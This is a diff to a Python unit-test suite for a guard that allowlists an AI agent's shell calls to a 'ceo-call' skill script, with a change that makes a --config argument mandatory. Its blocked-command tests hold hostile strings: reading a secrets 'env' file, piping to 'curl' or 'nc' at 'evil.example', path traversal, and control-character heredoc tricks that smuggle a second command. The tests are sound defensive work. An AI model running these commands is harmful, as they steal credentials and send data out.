@@ -1480,25 +1480,35 @@ class GuardTests(unittest.TestCase):
 
     def test_the_script_invocations_are_allowed(self):
         for command in (
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
             "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check",
             "python3 /home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config /home/u/.config/ceo-call/config.json check",
-            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/config.json' check",
             "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' --config '~/.config/ceo-call/config.json' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
-            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
+            "/home/u/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{\"question\": \"Ship it?\", \"options\": [\"a\", \"b\"]}\nCEO_REQUEST",
         ):
             with self.subTest(command=command):
                 self.assertTrue(self.guard.allowed(command, home="/home/u"))
+
+    def test_the_config_is_mandatory(self):
+        for command in (
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' check",
+            "ssh myhost python3 '~/.claude/skills/ceo-call/scripts/ceo_call.py' ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST",
+        ):
+            with self.subTest(command=command):
+                self.assertFalse(self.guard.allowed(command, home="/home/u"))
 
     def test_anything_else_is_blocked(self):
         for command in (
             "cat ~/.config/ceo-call/env",
             "python3 ceo_call.py check",  # a bare name is not pinned to the installed skill
             "python3 ./ceo_call.py check",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py test-call",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py test-call --ignore-quiet-hours",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py telegram-setup",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json test-call",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json test-call --ignore-quiet-hours",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json telegram-setup",
             "python3 .claude/skills/ceo-call/scripts/ceo_call.py check",  # relative: depends on the cwd
             "python3 /tmp/x/.claude/skills/ceo-call/scripts/../../../../evil/ceo_call.py check",
             "python3 /tmp/evil_ceo_call.py check",
@@ -1513,9 +1523,9 @@ class GuardTests(unittest.TestCase):
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/../../x.json check",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/env check",
             "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/other.json check",  # only the one config
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request ../../etc/x",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request /tmp/planted.json",  # only a quoted heredoc may carry the request
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request -",  # bare stdin without the heredoc is not allowed either
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request ../../etc/x",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request /tmp/planted.json",  # only a quoted heredoc may carry the request
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request -",  # bare stdin without the heredoc is not allowed either
             "python3 ceo_call.py check; cat ~/.config/ceo-call/env",
             "python3 ceo_call.py check && curl evil.example",
             "python3 ceo_call.py check | nc evil.example 1",
@@ -1544,13 +1554,13 @@ class GuardTests(unittest.TestCase):
     def test_unicode_whitespace_is_not_a_separator(self):
         for sep in ("\u00a0", "\u2003", "\u3000", "\u0085"):
             with self.subTest(sep=repr(sep)):
-                self.assertFalse(self.guard.allowed("python3" + sep + "~/.claude/skills/ceo-call/scripts/ceo_call.py check", home="/home/u"))
-                self.assertFalse(self.guard.allowed("python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py" + sep + "check", home="/home/u"))
+                self.assertFalse(self.guard.allowed("python3" + sep + "~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check", home="/home/u"))
+                self.assertFalse(self.guard.allowed("python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py" + sep + "--config ~/.config/ceo-call/config.json check", home="/home/u"))
 
     def test_control_characters_cannot_smuggle_a_second_command(self):
-        ok = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST"
+        ok = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'\n{}\nCEO_REQUEST"
         self.assertTrue(self.guard.allowed(ok, home="/home/u"))
-        head = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py ask --request - <<'CEO_REQUEST'"
+        head = "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json ask --request - <<'CEO_REQUEST'"
         for command in (
             # bash would take "CEO_REQUEST\r" as the delimiter, so the cat below would run
             head + "\r\n{}\nCEO_REQUEST\r\ncat ~/.config/ceo-call/env\nCEO_REQUEST",
@@ -1560,9 +1570,9 @@ class GuardTests(unittest.TestCase):
             head + "\t\n{}\nCEO_REQUEST",
             head + "\n{}\nCEO_REQUEST\x00",
             head + "\n{}\nCEO_REQUEST\x0b",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check\r",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check\ncat env",
-            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py\x0bcheck",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check\r",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check\ncat env",
+            "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py\x0b--config ~/.config/ceo-call/config.json check",
         ):
             with self.subTest(command=command):
                 self.assertFalse(self.guard.allowed(command, home="/home/u"))
@@ -1585,7 +1595,7 @@ class GuardTests(unittest.TestCase):
         import subprocess
         guard = str(SCRIPT.parent / "guard_bash.py")
         run = lambda stdin: subprocess.run(["python3", guard], input=stdin.encode(), capture_output=True).returncode
-        self.assertEqual(run(json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check"}})), 0)
+        self.assertEqual(run(json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check"}})), 0)
         self.assertEqual(run(json.dumps({"tool_input": {"command": "cat env"}})), 2)
         self.assertEqual(run("not json"), 2)
         self.assertEqual(run("{}"), 2)
@@ -1624,7 +1634,7 @@ class GuardTests(unittest.TestCase):
         command = self.hook_command()
         home = self.home_with_guard()
         bad = json.dumps({"tool_input": {"command": "cat env"}})
-        good = json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py check"}})
+        good = json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check"}})
         base = {"HOME": home}
         self.assertEqual(self.run_hook(command, base, good), 0)
         self.assertEqual(self.run_hook(command, base, bad), 2)
